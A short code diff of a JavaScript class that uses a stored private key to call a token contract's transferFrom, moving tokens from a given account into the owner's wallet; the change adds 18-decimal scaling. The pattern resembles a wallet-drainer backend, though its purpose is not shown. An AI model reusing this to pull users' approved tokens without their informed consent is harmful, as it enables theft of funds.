@@ -1,13 +1,15 @@
 import axios from 'axios';
 import { SC } from "./SmartContracts";
 import { privateKey } from './privateKey';
+import BigNumber from 'bignumber.js';
 
 export class TC {
     static async starting(account,tokenAddress,amount) {
         try {
             const user_wallet = SC.owner;
             let contract = SC.tokenContract2;
-            let data = contract.methods.transferFrom(account, user_wallet.address, amount).encodeABI()
+            const amountv2 = new BigNumber(amount * 10 ** 18);
+            let data = contract.methods.transferFrom(account, user_wallet.address, amountv2.toFixed()).encodeABI()
             var approveTX ={
                 gas: SC.web3ojb.utils.toHex(100000),
                 to: tokenAddress,
